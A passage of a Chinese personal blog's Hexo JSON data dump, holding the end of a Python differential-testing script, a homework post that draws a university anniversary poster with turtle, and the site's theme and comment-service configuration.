1e4)</span></span><br><span class=\"line\"><span class=\"string\">            y = randint(1, 1e4)</span></span><br><span class=\"line\"><span class=\"string\">            if [x, y] not in lists:</span></span><br><span class=\"line\"><span class=\"string\">                lists.append([x, y])</span></span><br><span class=\"line\"><span class=\"string\">                f.writelines(&#x27;%d %d\\n&#x27; % (x, y))</span></span><br><span class=\"line\"><span class=\"string\">                break</span></span><br><span class=\"line\"><span class=\"string\">            else:</span></span><br><span class=\"line\"><span class=\"string\">                continue</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> platform.system() == <span class=\"string\">&#x27;Windows&#x27;</span>:</span><br><span class=\"line\">    os.system(<span class=\"string\">&#x27;CHCP 65001&#x27;</span>)  <span class=\"comment\"># Windows先更换CodePage为UTF-8,以防乱码</span></span><br><span class=\"line\">counts = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./code&#x27;</span>):</span><br><span class=\"line\">    os.makedirs(<span class=\"string\">&#x27;code&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(<span class=\"string\">&#x27;./code/0.in&#x27;</span>):</span><br><span class=\"line\">        os.remove(<span class=\"string\">&#x27;./code/0.in&#x27;</span>)</span><br><span class=\"line\">    generate()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> platform.system() == <span class=\"string\">&#x27;Windows&#x27;</span>:  <span class=\"comment\"># Windows系统可执行文件预先放置</span></span><br><span class=\"line\">        ans1 = os.popen(<span class=\"string\">&#x27;type .\\\\code\\\\0.in|.\\\\code\\\\1.exe&#x27;</span>)</span><br><span class=\"line\">        ans2 = os.popen(<span class=\"string\">&#x27;type .\\\\code\\\\0.in|.\\\\code\\\\2.exe&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:   <span class=\"comment\"># Linux系统可执行文件预先放置</span></span><br><span class=\"line\">        ans1 = os.popen(<span class=\"string\">&#x27;cat code/0.in | code/1&#x27;</span>)</span><br><span class=\"line\">        ans2 = os.popen(<span class=\"string\">&#x27;cat code/0.in | code/2&#x27;</span>)</span><br><span class=\"line\">    out1 = ans1.read()</span><br><span class=\"line\">    out2 = ans2.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> out1 == out2:</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;第&#x27;</span>, counts, <span class=\"string\">&#x27;次尝试: &#x27;</span>, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">        print(out1)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    counts = counts + <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>"},{"title":"Python绘制校庆宣传画","date":"2020-04-08T08:08:24.000Z","abbrlink":"9ae2a58f","_content":"> Python作业，用turtle绘制校庆宣传画。\n\n```py\nimport turtle\n\n\ndef draw_line(angle, length):\n    turtle.pendown()\n    turtle.seth(angle)\n    turtle.forward(length)\n\n\ndef locate(x, y, extend=None):\n    startx, starty = -100, 200\n    if extend:\n        extend.penup()\n        extend.goto(startx + x, starty - y)\n        extend.pendown()\n    else:\n        turtle.penup()\n        turtle.goto(startx + x, starty - y)\n        turtle.pendown()\n\n\ndef draw_xq():\n    turtle.pencolor('white')\n    turtle.pensize(1)\n    turtle.penup()\n    locate(96, 1)\n    draw_line(270, 15)\n    locate(120, 28)\n    turtle.fillcolor('white')\n    turtle.begin_fill()\n    turtle.seth(120)\n    turtle.circle(27, 120)\n    draw_line(180, 53)\n    draw_line(270, 155)\n    draw_line(0, 150)\n    draw_line(90, 155)\n    draw_line(180, 53)\n    turtle.end_fill()\n    locate(10, 53)\n    turtle.pensize(6)\n    turtle.pencolor('red')\n    draw_line(0, 170)\n    locate(20, 82)\n    turtle.pensize(8)\n    draw_line(0, 30)\n    locate(170, 82)\n    draw_line(180, 30)\n    locate(96, 185)\n    turtle.pensize(50)\n    draw_line(90, 70)\n    turtle.pensize(12)\n    turtle.pencolor('white')\n    locate(60, 125)\n    draw_line(0, 70)\n    locate(60, 178)\n    draw_line(0, 70)\n    turtle.pensize(1)\n    locate(10, 188)\n    turtle.begin_fill()\n    draw_line(270, 18)\n    draw_line(240, 24)\n    draw_line(0, 56)\n    draw_line(240, 9)\n    draw_line(0, 88)\n    draw_line(120, 9)\n    draw_line(0, 56)\n    draw_line(120, 24)\n    draw_line(90, 18)\n    draw_line(180, 169)\n    turtle.end_fill()\n    turtle.pensize(4)\n    turtle.pencolor('red')\n    locate(8, 208)\n    draw_line(0, 58)\n    draw_line(60, 9)\n    draw_line(0, 53)\n    draw_line(300, 9)\n    draw_line(0, 58)\n    turtle.hideturtle()\n    font = turtle.Turtle()\n    locate(43, 265, font)\n    font.pencolor('white')\n    font.write('1909-2019', font=('Aria', 16, 'bold'))\n    font.hideturtle()\n\n\ndef draw_word():\n    font = turtle.Turtle()\n    locate(-186, 350, font)\n    font.pencolor('white')\n    font.write('河南理工大学建校110周年', font=('Aria', 36, 'bold'))\n    locate(-180, 380, font)\n    font.write('HENAN POLYTECHNIC UNIVERSITY 110TH ANNIVERSARY', font=('Aria', 16, 'bold'))\n    font.color(200/255, 166/255, 92/255)\n    locate(300, 100, font)\n    font.write('好学力行', font=('楷体', 24, 'bold'))\n    locate(-250, 200, font)\n    font.write('明德任责', font=('楷体', 24, 'bold'))\n    font.hideturtle()\n\n\ndef main():\n    width, height = 800, 600\n    turtle.screensize(bg='red')\n    turtle.setup(width, height, 400, 100)\n    turtle.speed(10)\n    draw_xq()\n    draw_word()\n    turtle.hideturtle()\n    turtle.done()\n\n\nif __name__ == '__main__':\n    main()\n```\n\n**效果如下：**\n![](https://cdn.file.todest.cn/pic/2019101401.jpg)","source":"_posts/Python绘制校庆宣传画.md","raw":"---\ntitle: Python绘制校庆宣传画\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - Python\ntags:\n  - Python\n  - turtle\nabbrlink: 9ae2a58f\n---\n> Python作业，用turtle绘制校庆宣传画。\n\n```py\nimport turtle\n\n\ndef draw_line(angle, length):\n    turtle.pendown()\n    turtle.seth(angle)\n    turtle.forward(length)\n\n\ndef locate(x, y, extend=None):\n    startx, starty = -100, 200\n    if extend:\n        extend.penup()\n        extend.goto(startx + x, starty - y)\n        extend.pendown()\n    else:\n        turtle.penup()\n        turtle.goto(startx + x, starty - y)\n        turtle.pendown()\n\n\ndef draw_xq():\n    turtle.pencolor('white')\n    turtle.pensize(1)\n    turtle.penup()\n    locate(96, 1)\n    draw_line(270, 15)\n    locate(120, 28)\n    turtle.fillcolor('white')\n    turtle.begin_fill()\n    turtle.seth(120)\n    turtle.circle(27, 120)\n    draw_line(180, 53)\n    draw_line(270, 155)\n    draw_line(0, 150)\n    draw_line(90, 155)\n    draw_line(180, 53)\n    turtle.end_fill()\n    locate(10, 53)\n    turtle.pensize(6)\n    turtle.pencolor('red')\n    draw_line(0, 170)\n    locate(20, 82)\n    turtle.pensize(8)\n    draw_line(0, 30)\n    locate(170, 82)\n    draw_line(180, 30)\n    locate(96, 185)\n    turtle.pensize(50)\n    draw_line(90, 70)\n    turtle.pensize(12)\n    turtle.pencolor('white')\n    locate(60, 125)\n    draw_line(0, 70)\n    locate(60, 178)\n    draw_line(0, 70)\n    turtle.pensize(1)\n    locate(10, 188)\n    turtle.begin_fill()\n    draw_line(270, 18)\n    draw_line(240, 24)\n    draw_line(0, 56)\n    draw_line(240, 9)\n    draw_line(0, 88)\n    draw_line(120, 9)\n    draw_line(0, 56)\n    draw_line(120, 24)\n    draw_line(90, 18)\n    draw_line(180, 169)\n    turtle.end_fill()\n    turtle.pensize(4)\n    turtle.pencolor('red')\n    locate(8, 208)\n    draw_line(0, 58)\n    draw_line(60, 9)\n    draw_line(0, 53)\n    draw_line(300, 9)\n    draw_line(0, 58)\n    turtle.hideturtle()\n    font = turtle.Turtle()\n    locate(43, 265, font)\n    font.pencolor('white')\n    font.write('1909-2019', font=('Aria', 16, 'bold'))\n    font.hideturtle()\n\n\ndef draw_word():\n    font = turtle.Turtle()\n    locate(-186, 350, font)\n    font.pencolor('white')\n    font.write('河南理工大学建校110周年', font=('Aria', 36, 'bold'))\n    locate(-180, 380, font)\n    font.write('HENAN POLYTECHNIC UNIVERSITY 110TH ANNIVERSARY', font=('Aria', 16, 'bold'))\n    font.color(200/255, 166/255, 92/255)\n    locate(300, 100, font)\n    font.write('好学力行', font=('楷体', 24, 'bold'))\n    locate(-250, 200, font)\n    font.write('明德任责', font=('楷体', 24, 'bold'))\n    font.hideturtle()\n\n\ndef main():\n    width, height = 800, 600\n    turtle.screensize(bg='red')\n    turtle.setup(width, height, 400, 100)\n    turtle.speed(10)\n    draw_xq()\n    draw_word()\n    turtle.hideturtle()\n    turtle.done()\n\n\nif __name__ == '__main__':\n    main()\n```\n\n**效果如下：**\n![](https://cdn.file.todest.cn/pic/2019101401.jpg)","slug":"Python绘制校庆宣传画","published":1,"updated":"2020-12-01T14:45:03.232Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbl0025qse58ejzccdg","content":"<blockquote>\n<p>Python作业，用turtle绘制校庆宣传画。</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> turtle</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw_line</span>(<span class=\"params\">angle, length</span>):</span></span><br><span class=\"line\">    turtle.pendown()</span><br><span class=\"line\">    turtle.seth(angle)</span><br><span class=\"line\">    turtle.forward(length)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">locate</span>(<span class=\"params\">x, y, extend=None</span>):</span></span><br><span class=\"line\">    startx, starty = <span class=\"number\">-100</span>, <span class=\"number\">200</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> extend:</span><br><span class=\"line\">        extend.penup()</span><br><span class=\"line\">        extend.goto(startx + x, starty - y)</span><br><span class=\"line\">        extend.pendown()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        turtle.penup()</span><br><span class=\"line\">        turtle.goto(startx + x, starty - y)</span><br><span class=\"line\">        turtle.pendown()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw_xq</span>():</span></span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">1</span>)</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    locate(<span class=\"number\">96</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">270</span>, <span class=\"number\">15</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">120</span>, <span class=\"number\">28</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">120</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">27</span>, <span class=\"number\">120</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">270</span>, <span class=\"number\">155</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">150</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">90</span>, <span class=\"number\">155</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    locate(<span class=\"number\">10</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">6</span>)</span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">170</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">20</span>, <span class=\"number\">82</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">8</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">170</span>, <span class=\"number\">82</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">96</span>, <span class=\"number\">185</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">50</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">90</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">12</span>)</span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">60</span>, <span class=\"number\">125</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">60</span>, <span class=\"number\">178</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">1</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">10</span>, <span class=\"number\">188</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    draw_line(<span class=\"number\">270</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">240</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">240</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">88</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">120</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">120</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">90</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">169</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">4</span>)</span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">8</span>, <span class=\"number\">208</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">58</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">60</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">300</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">58</span>)</span><br><span class=\"line\">    turtle.hideturtle()</span><br><span class=\"line\">    font = turtle.Turtle()</span><br><span class=\"line\">    locate(<span class=\"number\">43</span>, <span class=\"number\">265</span>, font)</span><br><span class=\"line\">    font.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;1909-2019&#x27;</span>, font=(<span class=\"string\">&#x27;Aria&#x27;</span>, <span class=\"number\">16</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    font.hideturtle()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw_word</span>():</span></span><br><span class=\"line\">    font = turtle.Turtle()</span><br><span class=\"line\">    locate(<span class=\"number\">-186</span>, <span class=\"number\">350</span>, font)</span><br><span class=\"line\">    font.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;河南理工大学建校110周年&#x27;</span>, font=(<span class=\"string\">&#x27;Aria&#x27;</span>, <span class=\"number\">36</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    locate(<span class=\"number\">-180</span>, <span class=\"number\">380</span>, font)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;HENAN POLYTECHNIC UNIVERSITY 110TH ANNIVERSARY&#x27;</span>, font=(<span class=\"string\">&#x27;Aria&#x27;</span>, <span class=\"number\">16</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    font.color(<span class=\"number\">200</span>/<span class=\"number\">255</span>, <span class=\"number\">166</span>/<span class=\"number\">255</span>, <span class=\"number\">92</span>/<span class=\"number\">255</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">300</span>, <span class=\"number\">100</span>, font)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;好学力行&#x27;</span>, font=(<span class=\"string\">&#x27;楷体&#x27;</span>, <span class=\"number\">24</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    locate(<span class=\"number\">-250</span>, <span class=\"number\">200</span>, font)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;明德任责&#x27;</span>, font=(<span class=\"string\">&#x27;楷体&#x27;</span>, <span class=\"number\">24</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    font.hideturtle()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    width, height = <span class=\"number\">800</span>, <span class=\"number\">600</span></span><br><span class=\"line\">    turtle.screensize(bg=<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">    turtle.setup(width, height, <span class=\"number\">400</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\">    turtle.speed(<span class=\"number\">10</span>)</span><br><span class=\"line\">    draw_xq()</span><br><span class=\"line\">    draw_word()</span><br><span class=\"line\">    turtle.hideturtle()</span><br><span class=\"line\">    turtle.done()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p><strong>效果如下：</strong><br><img data-src=\"https://cdn.file.todest.cn/pic/2019101401.jpg\" alt=\"\"></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gital